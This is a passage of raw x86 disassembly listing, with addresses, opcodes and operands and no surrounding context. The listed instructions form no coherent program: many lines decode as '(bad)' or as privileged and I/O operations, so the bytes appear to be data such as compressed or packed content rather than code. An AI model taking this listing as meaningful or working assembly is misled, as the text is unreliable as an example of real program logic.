  405172:	inc    esi
  405173:	cmp    BYTE PTR [ecx-0xd],al
  405176:	jg     0x405148
  405178:	xchg   ecx,eax
  405179:	stos   BYTE PTR es:[edi],al
  40517a:	aaa    
  40517b:	pop    esi
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	xor    DWORD PTR ds:0x1d9454c9,edi
  405183:	jbe    0x4051bc
  405185:	fs mov al,0xc4
  405188:	in     al,0x21
  40518a:	cmp    DWORD PTR [eax+edi*8+0x6409e91],eax
  405191:	lahf   
  405192:	push   edi
  405193:	cwde   
  405194:	repnz popf 
  405196:	leave  
  405197:	ret    0xa7a6
  40519a:	(bad)  
  40519b:	mov    cl,0x41
  40519d:	pop    ebx
  40519e:	inc    esp
  40519f:	push   0xffffffd4
  4051a1:	pop    ebp
  4051a2:	aaa    
  4051a3:	or     al,0x80
  4051a5:	mov    cl,0xe5
  4051a7:	into   
  4051a8:	inc    ebx
  4051a9:	shr    BYTE PTR [ebx-0x3aef5634],0x44
  4051b0:	ficomp WORD PTR [ebp-0x2d]
  4051b3:	fwait
  4051b4:	clc    
  4051b5:	jae    0x405195
  4051b7:	push   ebx
  4051b8:	aas    
  4051b9:	sbb    eax,0xa04a54f9
  4051be:	loopne 0x40516d
  4051c0:	push   ebp
  4051c1:	jl     0x40521b
  4051c3:	fldenv [ebp-0x11]
  4051c6:	arpl   WORD PTR [ebp-0x44],bp
  4051c9:	push   ebx
  4051ca:	test   DWORD PTR [edi],ecx
  4051cc:	inc    esi
  4051cd:	sub    esi,0x58
  4051d0:	dec    ecx
  4051d1:	and    eax,DWORD PTR ds:0xa7541bc5
  4051d7:	ins    BYTE PTR es:[edi],dx
  4051d8:	mov    ebx,DWORD PTR [ebp+eiz*2+0x12]
  4051dc:	call   0x71067c3e
  4051e1:	int3   
  4051e2:	jmp    0x4c94dd1c
  4051e7:	sub    esp,edx
  4051e9:	or     ch,BYTE PTR [ecx-0x77]
  4051ec:	pop    esp
  4051ed:	or     al,0xef
  4051ef:	inc    eax
  4051f0:	fcomp  DWORD PTR [eax+0x6b9bfd9f]
  4051f6:	psubq  mm3,QWORD PTR [ebx-0x60]
  4051fa:	popf   
  4051fb:	jae    0x405204
  4051fd:	pop    ds
  4051fe:	int3   
  4051ff:	inc    ecx
  405200:	push   eax
  405201:	inc    esp
  405202:	push   ecx
  405203:	pop    edi
  405204:	fnsave [ecx+0x3e]
  405207:	push   edi
  405208:	mov    ebp,DWORD PTR [esi+0x3d]
  40520b:	mov    eax,ds:0xa99cc5b5
  405210:	test   eax,0xd75c9455
  405215:	rol    BYTE PTR [ecx+0x36],0x5
  405219:	mov    ebx,0xce85d7d7
  40521e:	(bad)  
  40521f:	out    dx,eax
  405220:	and    eax,0x9c87088d
  405225:	and    BYTE PTR [ecx],al
  405227:	add    al,0x51
  405229:	loope  0x40528f
  40522b:	push   0xa8682890
  405230:	cld    
  405231:	popa   
  405232:	ret    0xd90e
  405235:	cmp    dl,bh
  405237:	lock aad 0x7a
  40523a:	leave  
  40523b:	je     0x4052b4
  40523d:	inc    esi
  40523e:	cwde   
  40523f:	push   es
  405240:	jl     0x40523b
  405242:	and    ch,ch
  405244:	es xchg ebp,eax
  405246:	mov    ebp,0x67ad7488
  40524b:	sbb    al,0xb5
  40524d:	hlt    
  40524e:	sahf   
  40524f:	push   esp
  405250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405252:	mov    ss,WORD PTR [esi]
  405254:	imul   edi,DWORD PTR [ebp+0x8],0xffffffb5
  405258:	fcmovbe st,st(6)
  40525a:	pop    eax
  40525b:	xchg   DWORD PTR [ebp-0xd50badb],edx
  405261:	inc    ecx
  405262:	cmp    DWORD PTR [ebp+eiz*2+0x170f9b03],ebp
  405269:	mov    cl,0x92
  40526b:	add    eax,ebx
  40526d:	inc    ecx
  40526e:	jmp    0x1a41:0x6baaeb47
  405275:	adc    DWORD PTR [ebp-0x1b],edx
  405278:	js     0x4052ae
  40527a:	mov    WORD PTR [eax+ebp*1-0x14],gs
  40527e:	imul   bl
  405280:	xchg   ebx,eax
  405281:	push   ss
  405282:	cli    
  405283:	xchg   BYTE PTR [edi+0x1b9df360],ch
  405289:	xchg   BYTE PTR [esi],bl
  40528b:	inc    esp
  40528c:	add    cl,BYTE PTR [esp+ebp*8+0x1ae15e3]
  405293:	ds sbb al,0xeb
  405296:	daa    
  405297:	(bad)  
  405298:	mov    ds:0x70061853,al
  40529d:	ficomp WORD PTR [edi-0x1e]
  4052a0:	push   ecx
  4052a1:	repnz fdiv QWORD PTR [edi-0x258aa2ba]
  4052a8:	dec    edi
  4052a9:	pushf  
  4052aa:	xchg   esi,eax
  4052ab:	enter  0xfef4,0xca
  4052af:	mov    al,ds:0xce96a146
  4052b4:	add    eax,0xe390855c
  4052b9:	sbb    BYTE PTR [ebp+0x3d],dl
  4052bc:	mov    esi,0xd4e29ae2
  4052c1:	sub    edx,DWORD PTR [eax]
  4052c3:	and    al,0x9
  4052c5:	dec    ebp
  4052c6:	push   ss
  4052c7:	jno    0x405292
  4052c9:	cli    
  4052ca:	and    bl,BYTE PTR [ecx+0x40ef9352]
  4052d0:	in     al,0x5b
  4052d2:	and    al,0xfb
  4052d4:	xchg   edx,eax
  4052d5:	adc    BYTE PTR [ecx],bl
  4052d7:	xchg   BYTE PTR [esi+0x119e96d2],al
  4052dd:	out    dx,eax
  4052de:	mov    edi,0xd13beb5f
  4052e3:	aaa    
  4052e4:	adc    dh,dl
  4052e6:	sub    al,0x6
  4052e8:	cmp    al,0xca
  4052ea:	in     al,0xce
  4052ec:	loopne 0x4052ce
  4052ee:	mov    ch,0xc9
  4052f0:	cmp    eax,0xa19c9431
  4052f5:	jmp    0x405309
  4052f7:	and    BYTE PTR [edx-0x63],ah
  4052fa:	fidivr DWORD PTR [esi+esi*2-0x70]
  4052fe:	adc    BYTE PTR [esi-0x4d23fb55],ah
  405304:	xor    eax,DWORD PTR [ebx+0x1aaf59c6]
  40530a:	sbb    edx,edi
  40530c:	es jge 0x405291
  40530f:	push   ebp
  405311:	jns    0x40535f
  405313:	daa    
  405314:	out    0xb2,eax
  405316:	dec    eax
  405317:	pop    ss
  405318:	sub    al,0x4f
  40531a:	fwait
  40531b:	jae    0x405391
  40531d:	dec    edi
  40531e:	retf   
  40531f:	mov    gs,ebx
  405321:	icebp  
  405322:	or     eax,0x204f281f
  405327:	pop    ebp
  405328:	inc    edi
  405329:	popa   
  40532a:	ret    0x2fc7
  40532d:	lds    ebp,FWORD PTR [eax+0x7b2e23cf]
  405333:	xlat   BYTE PTR ds:[ebx]
  405334:	sbb    BYTE PTR [edi+0x7d],al
  405337:	ret    0xf20
  40533a:	and    DWORD PTR [eax+ecx*1-0x1cf8cba5],esp
  405341:	and    BYTE PTR [ebp-0x5d0c749],cl
  405347:	dec    ebp
  405348:	in     al,0xa2
  40534a:	mov    edi,0xb991587
  40534f:	inc    ecx
  405350:	push   cs
  405351:	add    BYTE PTR [edx-0x2bce2898],0xa1
  405358:	aaa    
  405359:	xor    al,0x2a
  40535b:	mov    ebp,DWORD PTR [esi-0x12]
  40535e:	or     al,0x27
  405360:	fwait
  405361:	inc    esi
  405362:	xchg   edx,eax
  405363:	and    eax,0x191fa44a
  405368:	iret   
  405369:	lds    esi,FWORD PTR [ebp-0x22ad7fcf]
  40536f:	inc    esi
  405370:	inc    edx
  405371:	add    dh,bl
  405373:	mov    al,0xfb
  405375:	addr16 adc eax,0x47e36c2d
  40537b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40537c:	sbb    al,0xcb
  40537e:	lea    esi,[edi+0x689674c3]
  405384:	push   esi
  405385:	das    
  405386:	ins    BYTE PTR es:[edi],dx
  405387:	xor    DWORD PTR ds:0x729fc352,esi
  40538d:	jne    0x405332
  40538f:	mov    al,0x22
  405391:	or     esp,DWORD PTR [ebp-0x27]
  405394:	xchg   ecx,eax
  405395:	(bad)
  405398:	or     esi,DWORD PTR [esi-0x75625ca0]
  40539e:	int3   
  40539f:	pusha  
  4053a0:	mov    dh,0xe6
  4053a2:	jmp    0x2b5fdf84
  4053a7:	push   ebp
  4053a8:	pushf  
  4053a9:	mov    al,ds:0x42da2cc
  4053ae:	push   edx
  4053af:	les    edx,FWORD PTR [ecx-0x336f6e5d]
  4053b5:	jmp    0xbcea:0xb52f09b
  4053bc:	pop    ebp
  4053bd:	sar    DWORD PTR [edi],0xe3
  4053c0:	test   eax,0xce8f7efe
  4053c5:	push   edi
  4053c6:	cwde   
  4053c7:	packuswb mm2,QWORD PTR [ebx]
  4053ca:	mov    ecx,0xe798bd45
  4053cf:	xor    BYTE PTR [ecx-0x38],0xfd
  4053d3:	rcr    DWORD PTR [edx],0xe0
  4053d6:	(bad)  
  4053d7:	jmp    0xd31f:0x4dbe393a
  4053de:	lock test BYTE PTR [ecx+0x374e74d8],dl
  4053e5:	push   edi
  4053e6:	mov    dl,0x4b
  4053e8:	mov    al,0x55
  4053ea:	add    BYTE PTR [esi-0x29],ah
  4053ed:	jge    0x40539c
  4053ef:	fiadd  WORD PTR [ebp+0x58]
  4053f2:	jp     0x4053b9
  4053f4:	mov    al,ds:0xa07bc03c
  4053f9:	retf   0xddcf
  4053fc:	adc    DWORD PTR [edi+ecx*2+0x4f],0x36079de7
  405404:	mov    DWORD PTR [esi],ebx
  405406:	sbb    al,0x6f
  405408:	jmp    0x4053c1
  40540a:	pop    ss
  40540b:	jb     0x4053b8
  40540d:	loope  0x405415
  40540f:	xchg   esi,eax
  405410:	cmp    BYTE PTR [ecx+0x1a1537f1],bl
  405416:	dec    edi
  405417:	or     cl,0x2d
  40541a:	adc    eax,0xc6db361f
  40541f:	daa    
  405420:	hlt    
  405421:	or     bl,al
  405423:	sbb    DWORD PTR [edi],edi
  405425:	jge    0x405407
  405427:	xchg   esi,eax
  405428:	or     ebx,DWORD PTR ds:0x3719f8f8
  40542e:	dec    esi
  40542f:	out    0x50,al
  405431:	xor    DWORD PTR [eax+0x14da50b8],ebp
  405437:	std    
  405438:	jb     0x40540e
  40543a:	gs nop
  40543c:	inc    esi
  40543d:	lds    esi,FWORD PTR [ebp-0x6918b7e9]
  405443:	stc    
  405444:	jmp    0x3e41:0xbac6d3f7
  40544b:	adc    ah,al
  40544d:	pop    edx
  40544e:	sub    al,0xf2
  405450:	mov    BYTE PTR [edx+0x6f],cl
  405453:	jbe    0x40544d
  405455:	or     eax,0xcd524883
  40545a:	inc    esp
  40545b:	call   0xef707ae0
  405460:	loopne 0x40543e
  405462:	sub    ebp,DWORD PTR ds:0x9098bc3a
  405468:	enter  0x13,0xe4
  40546c:	test   DWORD PTR [edx+0x42],eax
  40546f:	sub    ecx,DWORD PTR [ecx-0x4557d8c3]
  405475:	fist   DWORD PTR [eax+0x2c3249cf]
  40547b:	jne    0x405432
  40547d:	dec    eax
  40547e:	sub    edx,eax
  405480:	(bad)  
  405481:	nop
  405482:	mov    eax,ds:0x297c38a0
  405487:	ins    BYTE PTR es:[edi],dx
  405488:	clc    
  405489:	add    eax,0x9660fc33
  40548e:	(bad)  
  40548f:	dec    edi
  405490:	gs mov edi,0xcde8e68e
  405496:	enter  0xbdcf,0xc7
  40549a:	jb     0x40543f
  40549c:	and    DWORD PTR [esi+edi*2],ebp
  40549f:	sbb    dl,BYTE PTR [ebp-0x1]
  4054a2:	cmp    edx,DWORD PTR [eax-0x60a81ed8]
  4054a8:	push   es
  4054a9:	xchg   esp,eax
  4054aa:	xor    bh,BYTE PTR [ecx-0x2]
  4054ad:	cs xchg esi,eax
  4054af:	sbb    DWORD PTR [edi],ebp
  4054b1:	pop    esi
  4054b2:	cwde   
  4054b3:	imul   BYTE PTR [edi-0x6b1ee393]
  4054b9:	ds pop ss
  4054bb:	xchg   edx,eax
  4054bc:	or     al,0x3d
  4054be:	dec    DWORD PTR [ebx-0x72]
  4054c1:	call   0x4404ad4a
  4054c6:	xor    BYTE PTR ds:0xbc76418b,cl
  4054cc:	data16 fcomp DWORD PTR [esi-0x6c6bf003]
  4054d3:	or     ebx,DWORD PTR [edi-0x4e]
  4054d6:	push   ss
  4054d7:	mov    edi,0xa69df45d
  4054dc:	xor    DWORD PTR [esi],esp
  4054de:	adc    cl,BYTE PTR [ebp+0x309ad4b7]
  4054e4:	call   0xba08:0x3d4899f0
  4054eb:	cmp    BYTE PTR [edx+0x6f],bl
  4054ee:	cmp    BYTE PTR [esi+0x42],0x32
  4054f2:	adc    esi,ebx
  4054f4:	mov    ds:0xc3878dba,eax
  4054f9:	or     DWORD PTR [esi+0x4509f8f1],0xffffffd0
  405500:	and    eax,DWORD PTR [edi-0x4c]
  405503:	shl    BYTE PTR [edi-0x723f7764],cl
  405509:	aaa    
  40550a:	pop    edi
  40550b:	fldenv [edx+ebx*4-0x37863383]
  405512:	and    dh,BYTE PTR [ebx+0x2d2bb0c8]
  405518:	or     DWORD PTR [esi-0x56f6405a],esi
  40551e:	and    ebp,ebx
  405520:	js     0x405521
  405522:	mov    esp,0xbcbd82e1
  405527:	shl    DWORD PTR [eax+0x75],1
  40552a:	mov    eax,ds:0xf4394f9a
  40552f:	dec    edi
  405530:	inc    DWORD PTR [ecx-0x1ac1a86a]
  405536:	fs int 0x39
  405539:	aas    
  40553a:	cmp    ch,BYTE PTR [eax+ebx*8]
  40553d:	pop    edi
  40553e:	ins    DWORD PTR es:[edi],dx
  40553f:	and    BYTE PTR [esi+0x6e],ch
  405542:	mov    al,0x62
  405544:	repz inc edx
  405546:	sbb    al,BYTE PTR [ecx+0x65]
  405549:	cdq    
  40554a:	aad    0x8
  40554c:	imul   edx,DWORD PTR fs:[eax],0x87deb865
  405553:	push   DWORD PTR ds:0x96ab0aa0
  405559:	inc    esp
  40555a:	and    al,BYTE PTR ss:[ebx-0x29]
  40555e:	inc    esi
  40555f:	mov    gs,WORD PTR [edx+0x29]
  405562:	xchg   DWORD PTR [ecx+0x4a],ecx
  405565:	xor    esp,DWORD PTR [edx-0x69]
  405568:	clc    
  405569:	jp     0x40550f
  40556b:	pop    ecx
  40556c:	inc    esp
  40556d:	adc    al,0x8d
  40556f:	sub    eax,ebx
  405571:	call   0xd3e62efe
  405576:	mov    DWORD PTR [edx*1+0x1d594a0],eax
  40557d:	sbb    al,0x6d
  40557f:	enter  0xf465,0x83
  405583:	cmp    ch,BYTE PTR [ebp-0x75e451e9]
  405589:	out    dx,eax
  40558a:	push   ds
  40558b:	dec    ebx
  40558c:	pop    ds
  40558d:	jno    0x405607
  40558f:	scas   eax,DWORD PTR es:[edi]
  405590:	inc    esi
  405591:	mov    ebx,0xd69d84ca
  405596:	sub    cl,BYTE PTR [edx]
  405598:	pop    ecx
  405599:	mov    ebx,0xe648d7b5
  40559e:	or     edx,ecx
  4055a0:	dec    ebx
  4055a1:	and    esp,eax
  4055a3:	ins    BYTE PTR es:[edi],dx
  4055a4:	jno    0x405589
  4055a6:	retf   0x4317
  4055a9:	out    dx,eax
  4055aa:	jno    0x40555f
  4055ac:	fnstsw WORD PTR ds:0xae2b9b23
  4055b2:	sbb    DWORD PTR [eax],edx
  4055b4:	or     BYTE PTR [ecx],0x22
  4055b7:	pop    ebp
  4055b8:	stc    
  4055b9:	jns    0x4055cb
  4055bb:	sbb    DWORD PTR [edx],esi
  4055bd:	adc    bl,cl
  4055bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055c0:	xchg   ebp,eax
  4055c1:	int    0xb2
  4055c3:	and    DWORD PTR [esi-0x6f9872b7],ecx
  4055c9:	mov    ah,0xe7
  4055cb:	sti    
  4055cc:	sar    BYTE PTR [edx+0x3a],0x43
  4055d0:	cmp    dl,BYTE PTR [ebx-0x20]
  4055d3:	in     eax,0xc7
  4055d5:	into   
  4055d6:	das    
  4055d7:	inc    esp
  4055d8:	mov    DWORD PTR [esi],ecx
  4055da:	or     al,0x96
  4055dc:	pop    esp
  4055dd:	rcr    DWORD PTR [edx+eax*2-0x16],1
  4055e1:	pop    esi
  4055e2:	fld    TBYTE PTR [ecx+0x318d1fa7]
  4055e8:	dec    edi
  4055e9:	clc    
  4055ea:	ret    0x19a0
  4055ed:	fmul   QWORD PTR [ebx+0x53]
  4055f0:	je     0x4055df
  4055f2:	cs cwde 
  4055f4:	es (bad) 
  4055f6:	dec    DWORD PTR [ecx-0x20bb524d]
  4055fc:	out    0x42,al
  4055fe:	bound  edi,QWORD PTR [esi]
  405600:	rol    ebx,0x4a
  405603:	push   ss
  405604:	add    dl,al
  405606:	out    dx,eax
  405607:	icebp  
  405608:	inc    ebx
  405609:	shr    BYTE PTR [edx+0x56478077],cl
  40560f:	lods   eax,DWORD PTR ds:[esi]
  405610:	shl    BYTE PTR [edx+eiz*8],0x79
  405614:	jo     0x4055e3
  405616:	fwait
  405617:	xor    dh,al
  405619:	aas    
  40561a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40561b:	cli    
  40561c:	mov    bh,0x68
  40561e:	ins    DWORD PTR es:[edi],dx
  40561f:	and    BYTE PTR [edi+esi*8],0xa5
  405623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405624:	je     0x405609
  405626:	call   0x3f30:0x34058204
  40562d:	icebp  
  40562e:	push   esi
  40562f:	lock popf 
  405631:	test   al,0xe
  405633:	inc    ecx
  405634:	sbb    bh,ah
  405636:	ficomp WORD PTR [ebx+0x1acb0ab9]
  40563c:	mov    ebp,0xb1fbc5bf
  405641:	nop
  405642:	sub    edi,DWORD PTR [ebx]
  405644:	or     eax,0xbaf7fab
  405649:	push   ecx
  40564a:	sti    
  40564b:	pop    esi
  40564c:	add    dh,BYTE PTR [ebp+0x17]
  40564f:	fistp  WORD PTR [ecx+0x3e08aa6e]
  405655:	pop    eax
  405656:	mov    ch,0x31
  405658:	xor    DWORD PTR [ebp+0x50],esp
  40565b:	mov    edi,0x91a2f5af
  405660:	cli    
  405661:	out    0x4e,al
  405663:	addr16 cli 
  405665:	sti    
  405666:	xor    al,0x6d
  405668:	jae    0x405686
  40566a:	mov    cs:0x76c9d1a9,al
  405670:	mov    ah,0x43
  405672:	mov    ecx,DWORD PTR [ecx-0xe]
  405675:	adc    eax,0xcca516ad
  40567a:	jb     0x405625
  40567c:	jbe    0x4056dd
  40567e:	enter  0xef3e,0xd7
  405682:	pop    ds
  405683:	mov    cl,0xb4
  405685:	inc    eax
  405686:	das    
  405687:	rcr    BYTE PTR [edx],cl
  405689:	dec    ecx
  40568a:	addr16 xchg esp,eax
  40568c:	cmp    bh,BYTE PTR [ecx+esi*1+0x20]
  405690:	ja     0x4056f6
  405692:	cld    
  405693:	adc    bh,BYTE PTR [eax]
  405695:	mov    al,ds:0xb7069e45
  40569a:	jae    0x4056a0
  40569c:	ret    
  40569d:	or     eax,0x1ac69257
  4056a2:	call   0xae3d83c3
  4056a7:	mov    bl,0xf6
  4056a9:	addr16 adc al,0xef
  4056ac:	add    al,0x4
  4056ae:	shr    DWORD PTR [esi-0x2b],cl
  4056b1:	dec    ebx
  4056b2:	push   eax
  4056b3:	add    al,0xd4
  4056b5:	(bad)  
  4056b6:	pop    esp
  4056b7:	lea    esp,[ebp+0x540f188c]
  4056bd:	dec    ebx
  4056be:	das    
  4056bf:	push   ecx
  4056c0:	je     0x40567a
  4056c2:	ds push 0xb02afcd7
  4056c8:	stos   DWORD PTR es:[edi],eax
  4056c9:	push   cs
  4056ca:	xchg   ecx,eax
  4056cb:	inc    esp
  4056cc:	push   es
  4056cd:	cmp    dh,bl
  4056cf:	cmp    DWORD PTR [esi+0x44],esp
  4056d2:	xor    BYTE PTR [ebp+0x7e591530],ch
  4056d8:	sbb    eax,0x53f744b7
  4056dd:	out    0x4b,eax
  4056df:	ss dec ecx
  4056e1:	mov    bh,BYTE PTR [edi+0x49]
  4056e4:	mov    BYTE PTR [edi+0x1f2728b8],dl
  4056ea:	hlt    
  4056eb:	mov    eax,DWORD PTR [ecx+esi*4-0x29]
  4056ef:	dec    edx
  4056f0:	dec    ebp
  4056f1:	xor    dl,BYTE PTR [edx-0x6c95485b]
  4056f7:	adc    dh,ah
  4056f9:	jbe    0x405770
  4056fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056fc:	or     ecx,DWORD PTR [esi-0x16dae719]
  405702:	ret    
  405703:	jo     0x4056cf
  405705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405706:	loop   0x4056fd
  405708:	pop    ds
  405709:	add    al,0x7
  40570b:	shl    BYTE PTR [esi-0x1318347b],1
  405711:	xchg   edi,eax
  405712:	int3   
  405713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405714:	push   0x27330d18
  405719:	jbe    0x405776
  40571b:	(bad)  
  40571c:	mov    eax,0x1a5fbefb
  405721:	cmc    
  405722:	ret    0x29c8
  405725:	lea    esp,[eax]
  405727:	xor    BYTE PTR [ebx-0xae4fa86],bl
  40572d:	xor    bl,BYTE PTR [ebx+eax*8]
  405730:	xchg   BYTE PTR [edi+0x38557f43],bh
  405736:	or     edx,DWORD PTR [ecx-0x16cb57bd]
  40573c:	fild   QWORD PTR [ecx-0x65974c84]
  405742:	loope  0x4057bd
  405744:	xor    esp,DWORD PTR [ecx+0x229de97c]
  40574a:	and    al,0xca
  40574c:	dec    ecx
  40574d:	addr16 jb 0x4056f2
  405750:	xchg   edx,eax
  405751:	retf   
  405752:	rcr    BYTE PTR ds:0x14734a43,0x5a
  405759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40575a:	inc    esi
  40575b:	dec    ebp
  40575c:	or     DWORD PTR [esi+0x1a963bed],0x8
  405763:	or     ch,al
  405765:	or     dh,BYTE PTR [edx+0x369db9d4]
  40576b:	add    eax,ebx
  40576d:	pop    es
  40576e:	or     DWORD PTR [edx],edx
  405770:	das    
  405771:	push   es
  405772:	test   eax,0x2ce4aeef
  405777:	data16 sub al,0xc3
  40577a:	popa   
  40577b:	inc    esp
  40577c:	pop    ecx
  40577d:	bound  eax,QWORD PTR [edi-0x78]
  405780:	pop    esp
  405781:	mov    ds:0xce5af162,eax
  405786:	shrd   DWORD PTR [ebp+0x6e],eax,0xa8
  40578b:	sahf   
  40578c:	xor    eax,0x3f5c88c6
  405791:	jo     0x40578e
  405793:	mov    BYTE PTR [esi],cl
  405795:	stos   BYTE PTR es:[edi],al
  405796:	jno    0x4057ab
  405798:	mov    eax,0xbc7344e7
  40579d:	lahf   
  40579e:	pushf  
  40579f:	out    0xc6,eax
  4057a1:	mov    ebp,0xfd68398c
  4057a6:	or     al,0x20
  4057a8:	push   esp
  4057a9:	mov    al,0xeb
  4057ab:	sub    BYTE PTR [esi-0xab423d6],0x46
  4057b2:	xchg   BYTE PTR [ecx],ah
  4057b4:	sub    DWORD PTR [esi+0x63],esp
  4057b7:	mov    edx,0x897fdecd
  4057bc:	mov    ds:0x4e10d141,eax
  4057c1:	push   0x40
  4057c3:	scas   eax,DWORD PTR es:[edi]
  4057c4:	(bad)  
  4057c5:	in     al,dx
  4057c6:	iret   
  4057c7:	jmp    ebx
  4057c9:	fcmovnbe st,st(3)
  4057cb:	stos   DWORD PTR es:[edi],eax
  4057cc:	fld    QWORD PTR [ecx]
  4057ce:	ret    0xad87
  4057d1:	and    ah,BYTE PTR [eax-0x3ec70187]
  4057d7:	cmc    
  4057d8:	int3   
  4057d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057da:	jbe    0x40583c
  4057dc:	mov    esp,esp
  4057de:	inc    eax
  4057df:	scas   eax,DWORD PTR es:[edi]
  4057e0:	into   
  4057e1:	or     BYTE PTR [edi-0x40],dl
  4057e4:	cmc    
  4057e5:	mov    bl,0xeb
  4057e7:	adc    DWORD PTR [eax+ecx*1-0x137bf10e],esi
  4057ee:	inc    eax
  4057ef:	outs   dx,BYTE PTR ds:[esi]
  4057f0:	test   eax,0xccdb22a9
  4057f5:	mov    esp,DWORD PTR [eax+esi*4-0x4]
  4057f9:	sbb    edi,DWORD PTR [ecx]
  4057fb:	loopne 0x40584d
  4057fd:	dec    esi
  4057fe:	xchg   esp,edi
  405800:	imul   ebp,DWORD PTR [edi+0x6],0x61
  405804:	rcr    BYTE PTR [edx+0x7a620419],0x5c
  40580b:	push   es
  40580c:	div    BYTE PTR [edi+0x2]
  40580f:	test   DWORD PTR [edx-0x170b4473],edi
  405815:	or     edi,esp
  405817:	aam    0xde
  405819:	xchg   ebx,eax
  40581a:	xchg   esi,eax
  40581b:	pusha  
  40581c:	sub    edx,DWORD PTR [ebx-0x1b3deeeb]
  405822:	or     ebp,esp
  405824:	push   ecx
  405825:	sbb    dh,BYTE PTR fs:[ebp-0x4d]
  405829:	push   ebp
  40582a:	push   ss
  40582b:	retf   0x43e5
  40582e:	or     BYTE PTR [edx],bh
  405830:	cdq    
  405831:	rcl    BYTE PTR [edx*8+0x1e4b3c42],1
  405838:	or     eax,0x8731e8fb
  40583d:	cmp    eax,0x2179c6d5
  405842:	and    edi,DWORD PTR [esi]
  405844:	add    eax,0xe140ce75
  405849:	fst    QWORD PTR [ecx+0x3ff70f85]
  40584f:	jecxz  0x4057d3
  405851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405852:	dec    esp
  405853:	test   eax,0x9f79281b
  405858:	rol    BYTE PTR [esi],cl
  40585a:	mov    ebp,0x2ed691fa
  40585f:	jno    0x4058b7
  405861:	in     eax,0x40
  405863:	sub    eax,0xfcfd1207
  405868:	int    0xca
  40586a:	test   eax,0xb29b06a3
  40586f:	sbb    edx,DWORD PTR [edx]
  405871:	mov    eax,ds:0x405f682d
  405876:	jle    0x4058a8
  405878:	push   edx
  405879:	and    ebx,DWORD PTR [edi-0x80]
  40587c:	rol    BYTE PTR [ebx+0x73],0xe0
  405880:	(bad)  
  405882:	push   ss
  405883:	ror    BYTE PTR [ebp+edx*4-0x13],cl
  405887:	inc    ebx
  405888:	sbb    eax,0x5218331f
  40588d:	outs   dx,DWORD PTR ds:[esi]
  40588e:	sub    ch,BYTE PTR [ebx-0x62]
  405891:	dec    DWORD PTR [edi+0x52c7eefe]
  405897:	fist   WORD PTR [ebx+eiz*4+0x36575f3a]
  40589e:	mov    cl,0xa7
  4058a0:	pxor   mm3,mm1
  4058a3:	sbb    al,0x9a
  4058a5:	sub    ecx,ecx
  4058a7:	pop    edx
  4058a8:	out    0xe8,eax
  4058aa:	mov    al,0x7d
  4058ac:	outs   dx,BYTE PTR ds:[esi]
  4058ad:	inc    edx
  4058ae:	xor    eax,0x97cb23fa
  4058b3:	dec    BYTE PTR [ebp-0x1e8c804e]
  4058b9:	mov    ds:0x9d18d83d,al
  4058be:	push   esi
  4058bf:	and    esp,DWORD PTR [edi]
  4058c1:	push   eax
  4058c2:	mov    bl,0xb
  4058c4:	lods   eax,DWORD PTR ds:[esi]
  4058c5:	lods   al,BYTE PTR ds:[esi]
  4058c6:	loop   0x40590e
  4058c8:	out    0x6d,eax
  4058ca:	mov    ?,WORD PTR [ebp+0x159d93ae]
  4058d0:	pop    esp
  4058d1:	sar    bl,cl
  4058d3:	loopne 0x405917
  4058d5:	mov    dl,0x6f
  4058d7:	outs   dx,BYTE PTR ds:[esi]
  4058d8:	mov    dl,dl
  4058da:	cmp    BYTE PTR [eax],dh
  4058dc:	nop
  4058dd:	jae    0x405922
  4058df:	in     eax,0x6e
  4058e1:	in     eax,0xfb
  4058e3:	sub    ebx,DWORD PTR [edx]
  4058e5:	in     eax,0x77
  4058e7:	popa   
  4058e8:	aaa    
  4058e9:	push   ebp
  4058ea:	clc    
  4058eb:	test   BYTE PTR [edi+0x1c],al
  4058ee:	sti    
  4058ef:	dec    edx
  4058f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f1:	lds    eax,FWORD PTR [edx+edx*8+0x3c]
  4058f5:	adc    al,0xda
  4058f7:	fld    DWORD PTR [esi]
  4058f9:	scas   eax,DWORD PTR es:[edi]
  4058fa:	pop    edi
  4058fb:	xor    al,dh
  4058fd:	js     0x4058b3
  4058ff:	lods   al,BYTE PTR ds:[esi]
  405900:	cmp    BYTE PTR [esi-0x568cb8bb],ch
  405906:	test   al,0xdb
  405908:	mov    eax,gs
  40590a:	inc    esp
  40590b:	cmp    eax,0xab3d1489
  405910:	and    edi,DWORD PTR [eax+edx*4-0x79]
  405914:	retf   0x11cf
  405917:	push   ss
  405918:	dec    ebx
  405919:	push   0xffffff98
  40591b:	mov    bl,0x6e
  40591d:	fs xchg ecx,eax
  40591f:	popa   
  405920:	sahf   
  405921:	jns    0x4058c6
  405923:	dec    ebp
  405924:	aas    
  405925:	jbe    0x40593e
  405927:	fist   WORD PTR [edx+0x10]
  40592a:	xor    DWORD PTR gs:[ecx-0x33eaaba0],edx
  405931:	mov    edi,0x21038dce
  405936:	and    al,0xb0
  405938:	bound  eax,QWORD PTR [eax+0x2]
  40593b:	or     al,0x75
  40593d:	jp     0x4059af
  40593f:	dec    edx
  405940:	sbb    DWORD PTR [ebp-0x12c0ec39],0xffffff94
  405947:	cmp    eax,ebx
  405949:	imul   BYTE PTR [edi-0x1a]
  40594c:	cwde   
  40594d:	sub    BYTE PTR [ebp+edi*4-0x65],dh
  405951:	(bad)  
  405952:	fld    TBYTE PTR [eax+0xf]
  405955:	pop    ebp
  405956:	inc    edi
  405957:	cs mov esi,0x51895b25
  40595d:	cmp    ah,BYTE PTR [edx]
  40595f:	mov    edx,0xfd86e540
  405964:	cli    
  405965:	or     eax,0x4c390fac
  40596a:	daa    
  40596b:	adc    DWORD PTR [ebx-0x8],0xffffffff
  40596f:	dec    edi
  405970:	ja     0x4059cd
  405972:	mov    ch,0xab
  405974:	jo     0x405958
